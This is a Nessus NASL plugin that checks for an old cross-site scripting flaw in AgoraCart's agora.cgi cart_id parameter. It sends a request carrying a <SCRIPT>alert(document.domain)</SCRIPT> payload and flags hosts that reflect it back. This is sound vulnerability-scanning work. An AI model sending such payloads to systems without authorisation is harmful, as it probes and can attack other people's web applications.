#
# This script was written by Matt Moore <matt.moore@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

include("compat.inc");

if (description)
{
 script_id(10836);
 script_version("$Revision: 1.35 $");
 script_cvs_date("$Date: 2015/01/23 22:03:55 $");
 script_bugtraq_id(3702);
 script_osvdb_id(698);
 script_cve_id("CVE-2001-1199");

 script_name(english:"AgoraCart agora.cgi cart_id Parameter XSS");
 script_summary(english:"Tests for Agora CGI Cross-Site Scripting");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI that is vulnerable to a
cross-site scripting issue.");
 script_set_attribute(attribute:"description", value:
"Agora is a CGI-based, e-commerce package. Due to poor input
validation, Agora allows an attacker to execute cross-site scripting
attacks.");
 script_set_attribute(attribute:"solution", value:"Upgrade to Agora 4.0e or newer.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:OF/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"vuln_publication_date", value:"2001/12/17");
 script_set_attribute(attribute:"plugin_publication_date", value:"2002/01/25");

 script_set_attribute(attribute:"potential_vulnerability", value:"true");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_ATTACK);

 script_copyright(english:"This script is Copyright (C) 2002-2015 Matt Moore");
 script_family(english:"CGI abuses : XSS");

 script_dependencie("http_version.nasl", "cross_site_scripting.nasl");
 script_require_keys("Settings/ParanoidReport");
 script_require_ports("Services/www", 80);
 exit(0);
}

include("audit.inc");
include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (report_paranoia < 2) audit(AUDIT_PARANOID);

port = get_http_port(default:80);

if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);

if(get_port_state(port))
{
 req = http_get(item:"/store/agora.cgi?cart_id=<SCRIPT>alert(document.domain)</SCRIPT>&xm=on&product=HTML", port:port);
 r = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
 if ( r == NULL ) exit(0);
 if("<SCRIPT>alert(document.domain)</SCRIPT>" >< r)	{
		security_warning(port);
		set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
	}
}
